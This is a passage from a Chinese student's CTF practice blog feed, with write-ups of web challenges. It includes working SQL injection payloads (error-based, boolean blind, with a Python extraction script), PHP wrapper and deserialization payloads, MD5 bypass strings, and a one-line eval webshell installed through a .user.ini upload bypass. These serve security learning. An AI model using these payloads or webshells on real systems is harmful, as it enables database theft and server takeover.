_value’)<br>updatexml(‘目标xml文件名’,’在xml中查询的字符串’,’替换后的值’)<br>它的报错方式和上面的相同，也是字符位置的格式不对导致报错，最后的参数可以随便写入，如下：  </p><blockquote><p>select username from security.user where id=1 and (updatexml(‘anything’,concat(‘~’,(select database())),’anything’))</p></blockquote><p>第二个参数格式不对导致报错。  </p><p>注：这两个函数报错查询的字符串长度有限，是32位。而双查询注入可以查询的字符长度是64位。如果要查询的字符串长度超过了限度，就要使用函数来分开查询，常见的有以下几种。  </p><p><strong>substring()**函数进行字符串截取。这个函数在布尔盲注中使用过。可以将字符串进行截取后返回。这个一次最多也只能截取32位。<br>**limit x,1</strong>逐一查询。在爆表，列，值时可以使用这个函数逐一返回而不是concat函数返回一列。<br>**{left(),right()}**这个函数可以从字符串左或者从字符串右开始读取相应位数的字符串。左右读到的合起来可以构成完整的。  </p><hr><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>了解了另外两种报错注入后我们来看这道题目。<br>我们使用Extractvalue()报错注入查询数据库名。空格被过滤使用（）来代替。  </p><blockquote><p>username=admin’^extractvalue(1,concat(~,(select(database()))))#&amp;password=aaa</p></blockquote><p>这里password也要输入，否则会报错（具体原因我还不知道）。<br>得到数据库名，看来这个报错注入行的通。<br><img src="https://i.loli.net/2021/02/08/dXC51mr4ap8Ttvj.png" alt="3.png"><br>爆表名。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(group _concat(table _name))from(information _schema.tables)where((table _schema)like(‘geek’)))))#</p></blockquote><p>得到表名<br><img src="https://i.loli.net/2021/02/08/ec6VuG4kUXtqwd5.png" alt="4.png"><br>爆列名。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(group _concat(column _name))from(information _schema.columns)where((table _name)like(‘H4rDsq1’)))))#</p></blockquote><p>注意这里使用like绕过=过滤。<br><img src="https://i.loli.net/2021/02/08/9byPsqfWKt1u6r3.png" alt="5.png"><br>爆flag。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(password)from(geek.H4rDsq1))))#</p></blockquote><p><img src="https://i.loli.net/2021/02/08/4uNXpdoJVMzISt8.png" alt="6.png"><br>发现只有一半。<br>这里使用right函数来从右查看另一半。  </p><blockquote><p>admin’^extractvalue(1,concat(~,(select(right(password,30))from(geek.H4rDsq1))))#</p></blockquote><p><img src="https://i.loli.net/2021/02/08/yUvuoCzWcPstKie.png" alt="7.png"><br>拼起来就得到真正flag。  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>通过这道题又多知道了两种报错注入方法，不得不感慨sql注入真的时方法万千，技巧也是多得多。<br>下面附上学习博客。<br><a href="https://blog.csdn.net/weixin_46145442/article/details/110254238?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161268582916780261991835%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161268582916780261991835&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-4-110254238.pc_search_result_cache&utm_term=extractvalue%25E5%2592%258Cupdatexml%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5">sql注入中报错注入函数extractvalue和updatexml函数的原理及使用</a><br><a href="https://blog.csdn.net/qq_40989258/article/details/96978319?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161268582916780261991835%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161268582916780261991835&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-96978319.pc_search_result_cache&utm_term=extractvalue%25E5%2592%258Cupdatexml%25E6%258A%25A5%25E9%2594%2599%25E6%25B3%25A8%25E5%2585%25A5">基于extractvalue()和updatexml()的报错注入</a></p>]]></content>
      
      
      <categories>
          
          <category> test30 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习21和布尔盲注</title>
      <link href="test29/undefined-undefined.html"/>
      <url>test29/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天这道题是我目前做过的较难的sql注入题目了。这道题目用到了布尔盲注的知识。  </p><h1 id="CISCN2019-华北赛区-Day2-Web1-Hack-World-1"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World-1" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World 1"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World 1</h1><p>打开这道题目，直接告诉我们flag就在flag表的flag的字段里面，我们只需要输入id就行了。<br><img src="https://i.loli.net/2021/02/07/7n5xsXIGVaRrQES.png" alt="61.png"><br>这直接给我弄蒙了，因为之前还没有见过这样的sql注入题，先尝试输入0，1，2等数字，发现在输入1，2数字时出现了不同回显，在输入0时报错。<br><img src="https://i.loli.net/2021/02/07/pXNxm5i1sqPyrUu.png" alt="63.png"><br><img src="https://i.loli.net/2021/02/07/JYuwIe1RPqvt5AZ.png" alt="62.png"><br><img src="https://i.loli.net/2021/02/07/LxzfGps4mj1XeBC.png" alt="64.png"><br>随后我又尝试按找常规方法进行查询，却发现被过滤了很多字符，导致查询后的界面都是一样的。<br><img src="https://i.loli.net/2021/02/07/OxpCMj9WucTXZDS.png" alt="65.png"><br>在尝试许多方式无果后，只能查看一下都有什么被过滤了。也就是fuzz测试。  </p><hr><h2 id="fuzz测试"><a href="#fuzz测试" class="headerlink" title="fuzz测试"></a>fuzz测试</h2><p>用我的话来讲，就是向系统发送大量恶意或随机的数据来测试系统的防护过滤，从而找到别的方式来绕过系统的过滤。<br>这个操作可以用软件进行，bp抓包软件就可以，和爆破密码的操作有点相像，他们二者的区别在于，爆破密码是为了找到密码，而fuzz测试是为了查看什么被过滤了，从而找到别的方法来绕过。<br>具体的方法我就不详细讲了，百度一下就有。下面附上一个教程。<br><a href="https://blog.csdn.net/hahazaizheli/article/details/96428290?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161263314316780299093685%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161263314316780299093685&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-96428290.pc_search_result_cache&utm_term=bp%25E6%258A%2593%25E5%258C%2585%25E5%25A6%2582%25E4%25BD%2595%25E8%25BF%259B%25E8%25A1%258Cfuzz">利用 Burpsuite Fuzz 实现 SQL 注入</a></p><hr><p>测试完后人傻了，发现有很多字符都被过滤了。<br><img src="https://i.loli.net/2021/02/07/Gw5Tq3Cghc7LZEF.png" alt="66.png"><br>482的都是被过滤的，其实union也被过滤了，只不过我这个字典里面没有这个字符，果然一个强大的字典还是很重要的。<br>可以看出来，我们之前用过的sql注入的方法在这里都行不通了。只能看一下别人的做法了。<br><strong>下面介绍一下新的sql注入方法——sql注入之布尔盲注</strong>  </p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息。<br>通过前面我们的尝试可以知道，当我们输入0和1时，页面返回的结果是不一样的，而且本题不支持联合查询，这就符合了布尔盲注的条件。那么具体是怎么样的注入呢？  </p><p>首先介绍相关的几个函数。  </p><blockquote><p>length()        返回字符串的长度<br>length(abc)        返回3，表示abc字符串长度为3  </p></blockquote><blockquote><p>substr()函数从特定位置开始的字符串返回一个给定长度的子字符串<br>substr()函数有三个参数，用法为：substr(str,pos,len)<br>str参数代表待截取的字符串<br>pos参数代表从什么位置开始截取<br>len参数表示字符串截取的长度<br>如select substr(‘hello’,1,1)返回的字符为“h”  </p></blockquote><blockquote><p>ascii()函数可以输出某个字符的ascii码值，ascii码共127个，此处注意ascii函数处理单个字符，如果是字符串则会处理第一个字符.<br>如select ascii(‘h’)返回104。  </p></blockquote><p>先介绍这三个函数，接着我们来看一下简单的布尔盲注的例子。<br>我们假设有一个数据库名为<strong>test</strong>。那么先给出下面的sql语句。  </p><blockquote><p>select user from test where id=1 and length((select database()))=4  </p></blockquote><p>这个语句很好理解，注入点是id=1，这里的关键字是<strong>and</strong>，我们知道只有and前后的条件都为真的时候，数据库才会输出结果。<br>那么我们可以看到and后面的length()函数，它里面有一个子查询，查询出数据库的名字并返回名字的长度，如果长度等于4，那么and前后都为真，就可以成功返回结果。<br>很明显，数据库test长度为4，所以可以返回结果。同理，如果我们把后面的判定改为length((select database()))&gt;3或者&gt;2都可以成功返回结果。但是改为&gt;4就不能返回结果了。<br>所以我们可以这样一个个的试，从&gt;1试到&gt;4，从而得到数据库的长度。  </p><p>经过上面的步骤，我们已经知道数据库的名字的长度，接下来就是它的名字是什么了。我们可以借鉴上面的思路，这样构造。  </p><blockquote><p>select user from test where id=1 and ascii(substr((select database()),1,1))=116  </p></blockquote><p>我们来看and后面的语句。先看里面的substr()函数，它截取了我们查询到的数据库名字的第一个字符，然后返回这第一个字符到ascii()函数中，我们知道，test第一个字符是t，它的ascii码是116。所以最终返回106这个数字，并将他和后面我们给出的条件判断，如果为真，那么and前后都为真，sql语句判定成功，也就返回结果。<br>很明显，我们这个语句是可以成功返回结果的，但是我们输入的是=115或者其他条件（&gt;116,&lt;116…..）那么它就无法成功返回结果。<br>而在其他题目中，我们是不知道数据库名字的，所以我们需要一个个的试，从1到这个字符的ascii码为止，而我们判断是否正确的方法就是观察页面的不同返回（true或false）。<br>同理，第二个字符也是这样得出来的。  </p><blockquote><p>select user from test where id=1 and ascii(substr((select database()),2,1))…..(填判断条件)   </p></blockquote><p>第三个，第四个字符也是如此。<br>这样我们就能查出数据库的名字了。<br>那么表名和列名，字段信息是不是都可以沿用这个思路呢？<br>是的。只需要稍作改动就可以了。下面给出如何查表名。   </p><p>求当前数据库存在的表的数量。  </p><blockquote><p>SELECT * from users WHERE id = 1 AND<br>(select count(table_ name) from information _ schema.tables where table_schema = database()) = 4(这个数量也是要一个个试来判断)</p></blockquote><p>求当前数据库表的表名长度。  </p><blockquote><p>SELECT * from users WHERE id = 1 AND (LENGTH((select table _ name from information _ schema.tables where table_schema = database() LIMIT 0,1)<br>)) = 6（这个长度也是要自己试出来）<br>LIMIT 0,1令表名一个个显示。之前的双查询注入使用到过。  </p></blockquote><p>求表名。  </p><blockquote><p>SELECT * from users WHERE id = 1<br>AND ASCII(SUBSTR(<br>(select table_ name FROM information _schema.tables<br>where table _schema = database() LIMIT 0,1),<br>1,1))&gt;…..(依旧是试)  </p></blockquote><p>列和字段信息都是这样的步骤。<br>可以看出布尔盲注的工作量是巨大的，因为要一个一个字符的试出来，长度和数量也要一个个的试，所以手工注入是不可能，所以布尔盲注一般都要用到脚本。再次感受到学会python的重要性。  </p><p>总结一下，布尔盲注的核心就是利用网页的不同的返回显示和几个函数叠加以及关键字and，在无法利用联合注入和网页没有回显位时通过网页不同的返回信息（真或者假）判断一个个所注入的字符，最后得到数据库信息。用到的这些函数都有替代的函数，百度即可。  </p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>那么回到这道题目，我们已经知道，当我们输入0和1时网页返回的信息不同，并且它并未过滤我们进行布尔盲注所需要的函数，虽然过滤了空格，但是可以使用左右括号绕过，所以我们可以这样构造sql语句。  </p><blockquote><p>1^if(ascii(substr((select(flag)from(flag)),{0},1))&gt;{1},0,1)</p></blockquote><p>这个语句中也有一些知识点。<br>首先是^这个异或符号，这是一个逻辑运算，运算法则简而言之就是两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1），我们用它来代替and。<br>接着就是这个if语句，这是sql的三目运算语句。  </p><blockquote><p>if( 表达式1，表达式2，表达式3)<br>如果表达式1是正确的，那么执行表达式2，否则执行表达式3</p></blockquote><p>我们可以看到这个语句将会这样执行:我们从flag表的flag字段中查询出flag，并对flag的字符串进行一个个的截取。<br>如果flag的第一个字符的ascii码大于1，那么返回0，1^0为真，那么结果为1，也就是最终为id=1，输出glzjin wants a girlfriend的界面。<br>反之，如果flag第一个字符不大于1，那么返回1，1^0为假，结果为0，也就是id=0，输出报错界面。<br>我们将这个语句放到脚本中去，让判断的字符位和ascii码自己增加，这样就能容易的得到flag。<br>附上大佬的脚本。又感受了学好python的重要性。  </p><pre><code>import requests  import time  url=&quot;http://3820bdac-9613-4057-  bfb0-5d88973f7c2d.node3.buuoj.cn/index.php&quot;  flag=&quot;&quot;  for i in range(0,50):#flag长度，跑到一半可修改此值，继续跑后边的数据      print(i,&quot;:&quot;)      low=32      high=128      mid = (low+high)//2      while low&lt;=high:          #print(mid)      #for j in range(32,128):#可见字符长度          data=&#123;              &quot;id&quot;:&quot;1^if(ascii(substr((select(flag)from  (flag)),&#123;0&#125;,1))&gt;&#123;1&#125;,0,1)&quot;.format(i,mid)              &#125;          t = requests.post(url,data=data)          #print(t.text)          if(&quot;glzjin wants a girlfriend&quot; in t.text):              low=mid+1              mid = (low+high)//2          else:              high=mid-1              mid = (low+high)//2      flag+=chr(high+1)      print(flag)      time.sleep(2) </code></pre><p>跑出来的结果。<br><img src="https://i.loli.net/2021/02/07/RhgtIY2n6yaE5vd.png" alt="67.png">  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>脚本的使用和布尔盲注的学习，还有fuzz测试来找到绕过方法。这道题还是比较难的。主要是还不会写脚本。<br>附上学习的相关博客。<br><a href="https://blog.csdn.net/qq_35569814/article/details/100175886?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161263055316780274123160%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161263055316780274123160&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-100175886.pc_search_result_cache&utm_term=sql%25E5%25B8%2583%25E5%25B0%2594%25E7%259B%25B2%25E6%25B3%25A8">SQL注入之布尔盲注</a><br><a href="https://blog.csdn.net/weixin_45146120/article/details/100104131?ops_request_misc=%25257B%252522request%25255Fid%252522%25253A%252522161263358416780269891473%252522%25252C%252522scm%252522%25253A%25252220140713.130102334.pc%25255Fall.%252522%25257D&request_id=161263358416780269891473&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-3-100104131.pc_search_result_cache&utm_term=%25E5%25B8%2583%25E5%25B0%2594%25E7%259B%25B2%25E6%25B3%25A8">布尔盲注详解</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test29 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习20</title>
      <link href="test28/undefined-undefined.html"/>
      <url>test28/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天的题目是一道综合型的题目。  </p><h1 id="ZJCTF-2019-NiZhuanSiWei-1"><a href="#ZJCTF-2019-NiZhuanSiWei-1" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei 1"></a>[ZJCTF 2019]NiZhuanSiWei 1</h1><p>打开题目，可以看到源码。<br><img src="https://i.loli.net/2021/02/05/pGI7dQRwKS8JNHF.png" alt="58.png"><br>分别有三个变量，都是以get方式传参。可以看到，我们必须要满足第一个if才能有后面的动作。  </p><blockquote><p>if(isset($text)&amp;&amp;(file_ get_contents($text,’r’)===”welcome to the zjctf”))</p></blockquote><p>这个if是先判断text是否为变量，然后读取text里面的内容并和welcome to the zjctf比较，如果text内容是这句话那么就可以接着进行。<br>一开始我想的是直接传参，构造/?text=welcome to the zjctf。<br>但是发现这样行不通，猜测是file_ get_contents（）函数是读取文件内容，而我们传参只是将值赋给了变量，这仍旧无法使函数读出text文件里有什么内容。<br>所以只能换另一种方法，用伪协议data://来写入字符串。关于伪协议可以查看我的另一篇博客笔记。这里简单说一下data://伪协议。  </p><hr><h2 id="伪协议data"><a href="#伪协议data" class="headerlink" title="伪协议data://"></a>伪协议data://</h2><p>使用条件allow _url _fopen ：on<br>allow _url _include：on<br>可以用该协议传递相应格式的数据。通常可以用来执行php代码<br>data://text/plain，<br>data://text/plain；base64，  </p><blockquote><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain">http://127.0.0.1/cmd.php?file=data://text/plain</a>,<?php phpinfo()?></p><p><a href="http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=">http://127.0.0.1/cmd.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</a>  </p></blockquote><hr><p>所以我们可以这样构造payload，把welcome to the zjctf写入text这个文件中。  </p><blockquote><p>?text=data://text/plain,welcome to the zjctf</p></blockquote><p>可以看到我们进入下一个界面。<br><img src="https://i.loli.net/2021/02/05/bRWcZJ21glnaCqx.png" alt="59.png"><br>根据开始的源码可以看到有一个uesless.php，可以确定这个是我们接下来要查看的文件。<br>看到有这样一个函数：include($file);那就是include（）包含漏洞了，直接上伪协议php://filter来读这个文件。  </p><blockquote><p>file=php://filter/read=convert.base64-encode/resource=useless.php  </p></blockquote><p>经过解码后得到这个php文件的源码。<br><img src="https://i.loli.net/2021/02/05/BT56PSd4AiI7L3j.png" alt="60.png"><br>可以看出来flag在flag.php里，我们如何读取这个文件呢，可以看到这个文件里有一个file_ get_contents（）函数，而里面的参数就是file，所以我们给file赋值flag.php就可以读取flag.php文件。<br>接着就是如何构造payload了，在这里我犯了个迷糊，文件里可以看到要序列化，一开始我直接来了个/?file=O:4:”Flag”:1:{s:4:”file”;s:8:”flag。php”;}却发现来了个not now，回头再看看源码发现漏了password这个变量。<br>因为file变量是被正则过滤了flag这个字符串的。所以我们不能通过file来上传我们的序列化。<br>所以我们应该再传参password。  </p><blockquote><p>/?password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p>这样变量password经过反序列化函数后就可以读取flag了。<br>最后要按一下f12才能看到flag。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目三个变量各有用处，text是开始的第一步要用到的，而file用来查看另一个php文件，password变量用来读取flag。<br>这道题目考了伪协议和序列化的知识，本身不难，重点是第一个data://伪协议的使用，之前我以为这个只能执行php代码，这道题让我知道了它还有写入的功能。确实长了见识。</p>]]></content>
      
      
      <categories>
          
          <category> test28 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习19</title>
      <link href="test27/undefined-undefined.html"/>
      <url>test27/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又学到了一种特殊的sql绕过注入的方法。  </p><h1 id="BJDCTF2020-Easy-MD5-1"><a href="#BJDCTF2020-Easy-MD5-1" class="headerlink" title="[BJDCTF2020]Easy MD5 1"></a>[BJDCTF2020]Easy MD5 1</h1><p>打开题目，是一个登录页面。<br><img src="https://i.loli.net/2021/02/04/vr9YKLGBQIxnEzt.png" alt="19.png"><br>他让我们提交查询，可以猜想这是一个sql注入题，但是无论如何注入都没有回显和报错，这让我不知道如何进行下去，只能先抓包试一下。<br><img src="https://i.loli.net/2021/02/04/Qs6LvM8yREoYfhc.png" alt="20.png"><br>通过抓包的请求头里的信息可以看到有一个提示：<br>select * from ‘admin’ where password=md5($pass,true)<br>看来这个就是后台的sql语句了，可以看到我们输入的password经过了一个md5（）函数的加密，变成了别的语句。这也就解释了为什么我们输入的用于注入的语句都失效了。  </p><h2 id="md5函数"><a href="#md5函数" class="headerlink" title="md5函数"></a>md5函数</h2><p><img src="https://i.loli.net/2021/02/04/APICF3yWV5iRsb9.png" alt="21.png"><br>可以看到，md5函数计算出来的md5散列被规定成原始 16 字符二进制格式输出，那么这样会输出什么呢？我测试了一下。<br><img src="https://i.loli.net/2021/02/04/RZmJ7LVrh9uBMTw.png" alt="22.png"><br>好家伙，完全不能看，所以现在我们要做的就是找到一个字符串，当他经过这个md5函数后输出的字符串仍然可以用于sql注入。<br>到这个地方我就卡住了，只能看一下别人是如何做到的。<br>看了别人的wp发现可以写一个脚本来找到这样的字符串(tql)，我直接把这个字符串拿过来用了。  </p><blockquote><p>ffifdyop</p></blockquote><p>这个字符串在经过md5函数后就成了’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c这样的字符，再经过mysql的转化后成了’or’6]!r,b。<br>这样一来，后台的sql语句就成了这样的：  </p><blockquote><p>select * from ‘admin’ where password=’’or’6]!r,b’</p></blockquote><p>当or后面接的是一个数字的话，sql语句就变成：  </p><blockquote><p>select * from ‘admin’ where password=’’or true</p></blockquote><p>这也就是一个万能密码。所以我们可以成功登入。<br><img src="https://i.loli.net/2021/02/04/z6PEBMjLsOfqSu9.png" alt="23.png"><br>查看源码。<br><img src="https://i.loli.net/2021/02/04/kFKr3CvQa4H5es9.png" alt="24.png"><br>发现这里是一个md5的弱类型绕过。他要求我们输入的a，b变量 不相等，但是经过md5加密后相等。<br>如果我们输入构造这样的payload  </p><blockquote><p>/?a=QNKCDZO&amp;b=s878926199a  </p></blockquote><p>那么他们本来是不相等的，但是经过md5加密后的开头都是0e，而这样的开头在==比较下会被识别为科学计数法，也就是0，那么0=0为真，所以就能满足这两个条件。<br>这样的字符串有很多：240610708，aabg7XSs，aabC9RqS，<br>s878926199a。<br>接着我们进入下一个界面.<br><img src="https://i.loli.net/2021/02/04/w8XKuFZl6Q1SHym.png" alt="25.png"><br>发现这是一个强类型的绕过，如果我们再次输入上面的字符串，到了===的md5比较就没办法绕过了。因为===要求全等，也就说不能看作科学计数法。所以我们要用别的方法。<br>可以知道，当md5函数收到的不是字符串而是数组的时候，它并不会报错，而是会返回null，在强比较===里，null===null为真。这样就能绕过了。<br>所以我们这样构造：  </p><blockquote><p>param1[]=1&amp;param2[]=2</p></blockquote><p>这样post过去就能得到flag了。  </p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题最重要的一点还是绕过md5的sql注入，这个字符串确实对我来说还是不好找到的，后面的md5绕过其实网上有很多字符串，多积累在这个地方还是难不倒的。<br>附上md5绕过的讲解和积累。<br><a href="https://blog.csdn.net/EC_Carrot/article/details/109525162?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161242526816780255252599%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161242526816780255252599&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-7-109525162.pc_search_result_cache&utm_term=php+md5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87&spm=1018.2226.3001.4187">【PHP】MD5比较漏洞 弱比较、强比较、强碰撞</a></p>]]></content>
      
      
      <categories>
          
          <category> test27 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习18</title>
      <link href="test26/undefined-undefined.html"/>
      <url>test26/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天做了一道别样的上传文件题。   </p><h1 id="SUCTF-2019-CheckIn-1"><a href="#SUCTF-2019-CheckIn-1" class="headerlink" title="[SUCTF 2019]CheckIn 1"></a>[SUCTF 2019]CheckIn 1</h1><p>打开题目，发现让我们上传文件，毫不犹豫的写了个一句话木马上传抓包。<br><img src="https://i.loli.net/2021/02/04/WyhbxgpBLC5POAm.png" alt="13.png"><br>抓包后发现它过滤了php语言中的<?和?>符号，从以前做过的类似的题目积累可以知道这个符号用&lt;script来绕过，所以这样构造一句话木马。  </p><blockquote><p>&lt; script language=”php”&gt;eval($_REQUEST[shell]) </script >  </p></blockquote><p><img src="https://i.loli.net/2021/02/04/L2wu7oOjN59Y1aP.png" alt="14.png">  </p><p>接着它检测出来这个文件不是图片。我们先修改文件类型Content-Type，改为image/jpg。<br><img src="https://i.loli.net/2021/02/04/c9MqKxInWEv5bjP.png" alt="15.png"><br>发现它依旧检测出来不是图片，那么我们就在文件头加上GIF89a图片头。  </p><p><img src="https://i.loli.net/2021/02/04/pgKyNdIYWXStC4n.png" alt="16.png"><br>可以可看到成功上传，接着就是修改文件后缀，让他是一个php文件，只有这样才能执行我们的一句话代码。但是经过多次尝试可以知道它过滤了php的后缀，所以我们要想别的方法来上传。  </p><hr><h2 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h2><p>看了别人的wp后发现这道题要利用.user.ini文件来绕过对php后缀名的检测。<br>这个文件是php中的配置文件，搭过博客的可以知道配置文件管理着许多操作，而php.ini就是管理着所有php配置的配置文件，是php的默认配置文件，也就相当于admin用户。<br>但是.user.ini也是php配置文件，与默认的php.ini不同，这个是我们用户可以自定义的php.ini，当然，它可以操作的配置项相较于php.ini来说较少，也就相当于普通用户。<br>其中，利用.user.ini可以配置的项中有两个可以为我们所用。  </p><blockquote><p>auto_ append _ file<br>auto_ prepend _file</p></blockquote><p>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了include()函数。而auto_ append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：  </p><blockquote><p>auto_ prepend_file=01.gif</p></blockquote><p>01.gif就是要包含的文件。这样就可以使所有的php文件都包含一个01.gif的文件。<br>所以我们就可以利用这一点来构造后门，上传一句话木马。  </p><hr><p>知道道题原理后我们可以先上传一个.user.ini文件。  </p><blockquote><p>GIF89a<br>auto_ prepend_file=shell.gif<br><img src="https://s3.ax1x.com/2021/02/04/ylJyfP.md.png" alt="ylJyfP.md.png"><br>这样就实现了一个配置——使所有的php文件都包含一个shell.gif文件，这样就能解析我们上传的图片马。从而实现一句话木马功能。<br>接着再上传我们的图片马。<br><img src="https://s3.ax1x.com/2021/02/04/ylJROg.md.png" alt="ylJROg.md.png"><br>我们可以看到文件中有一个index.php文件，而我们的图片马也就包含在了这个php文件中，进而被解析，成为后门。<br>接下来用剑蚁连接或者直接在网址post数据就可以查看到flag了。  </p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题给出了另一种绕过上传文件限制的思路，当过滤了php的所有可以用的后缀名时，我们可以通过修改php的配置文件令所有php文件都包含我们上传的图片马，从而可以实现上传图片马被解析达到上传一句话木马的目的。<br>下面附上详细的讲解。<br><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.ini文件构成的PHP后门</a>  </p>]]></content>
      
      
      <categories>
          
          <category> test26 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入练习5-6</title>
      <link href="test25/undefined-undefined.html"/>
      <url>test25/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天学习一个新的sql注入方式——双查询注入。  </p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p>先说明原理：  </p><blockquote><p>原理：简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p></blockquote><p>接着介绍一下这个查询方式要用到的函数：  </p><blockquote><p>rand()是一个生成随机数的函数，他会返回0到1之间到一个值。<br>floor()是取整函数了，会返回小于等于你输入的数的整数。<br>count()是一个聚合函数，用户返回符合条件的记录数量。  </p></blockquote><p>那么这三个函数结合到一起会发生什么呢？<br>下面介绍一下双查询注入的格式：  </p><blockquote><p>select count(*),concat_ ws(‘:’,([子查询],floor(rand() *  2))) as a form [table_name] group by a;&lt;&gt;</p></blockquote><p>我们来一点一点的理解这个语句。先看floor(rand() *2))这个叠加函数。 首先这个 rand() *2使最后返回的数大小在0-2之间（因为rand（）函数返回的值在0-1之间，乘2后就在0-2之间了），随后返回的数又经过floor()取整函数，那么最终得到的数要么是0，要么是1。<br>接下来我们扩展这个语句：  </p><blockquote><p>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</p></blockquote><p>可以看到我们使用concat将SELECT database()和FLOOR(RAND()*2这两个语句连接起来，concat语句会将两个返回的值连接到一块。比如SELECT concat(‘string1’,’string2’);显示的结果就是string1string2。<br>那么我们可以推断出，这样的语句返回的结果不是security0就是security1了。  </p><p>如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，users表里有13个用户，所以返回13条。<br>如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。所以当我们from information _ schema.schemata时，它便返回（当前使用的数据库名字+0或1）一共有几个数据库便返回几条结果。  </p><p>但是想要报错count和group by语句是不能少的，接下来我们先用分组语句group by将我们得到的很多条结果（security0和security1）进行分组。  </p><blockquote><p>select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</p></blockquote><p>我们给这些结果新建了一个表，通过<strong>as a</strong>起名为a，在这个表里security0的分到一组，security1的分到另一组，那么这时候我们的这个名为a的表里只剩下两个结果了：security0和security1.   </p><p>最后我们便插入聚合函数count(* )，这个函数返回包括所有列，返回表中的记录数，相当于统计表的行数。但是如果我们在这里使用，就会发生报错。（原因是floor( random(0) *2 )的不确定性）  </p><hr><h3 id="报错具体原因"><a href="#报错具体原因" class="headerlink" title="报错具体原因"></a>报错具体原因</h3><p>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0) * 